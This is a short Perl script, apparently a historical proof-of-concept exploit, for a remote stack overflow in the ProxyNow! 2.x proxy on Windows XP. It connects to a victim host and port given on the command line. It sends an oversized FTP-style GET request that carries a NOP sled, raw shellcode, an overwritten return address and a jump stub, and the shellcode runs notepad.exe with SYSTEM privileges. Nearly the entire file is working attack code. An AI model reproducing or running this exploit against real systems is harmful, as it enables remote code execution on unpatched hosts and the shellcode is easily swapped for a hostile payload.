#########################################################################
#!/usr/bin/perl -w
#
# Remote Stack Overflow in ProxyNow! 2.x PoC Exploit
#
# Tested on Windows XP Home SP1
#
# Ever seen notepad.exe with SYSTEM privileges? :-/
#
#  - by Peter Winter-Smith [peter4020@hotmail.com]

use IO::Socket;

if(!($ARGV[1]))
{
print "Usage: proxynow.pl <victim> <port>\n" .
       "\tDefault port is 3128\n\n";
exit;
}

print "Remote Stack Overflow in ProxyNow! PoC - Executes notepad.exe\n" .
      "Notepad.exe will only be visible from the Task Manager!\n\n";

$victim = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Unable to connect to $ARGV[0] on" .
                                   "port $ARGV[1]";

$nops      =            "\x90\x90\x90\x90";

$subcode   =            "\x89\xE0\x05\x03\xFF\xFF\xFF\xFF" .
                        "\xE0";

$shellcode =            "\x31\xC9\x51\x68\x65\x70\x61\x64" .
                        "\x68\xFF\x6E\x6F\x74\x8D\x44\x24" .
                        "\x01\x50\xB8\x44\x80\xC2\x77\xFF" .
                        "\xD0\xCC";

$pad = "XXXXXXXX";

$ebp = "BBBB";
$eip = "\x3B\x58\x01\x10";


$bad    = "GET ftp://www.nosite.com/" . "\x90"x33 . $shellcode . "a"x190 .
          $ebp . $eip . $nops . $subcode . $pad . "\x20HTTP/1.1\r\n\r\n";

print $victim $bad;

print "[+] Data sent: Check for notepad.exe running as SYSTEM!\n";

sleep(2);

close($victim);

print "[+] Done!\n";
exit;
#########################################################################


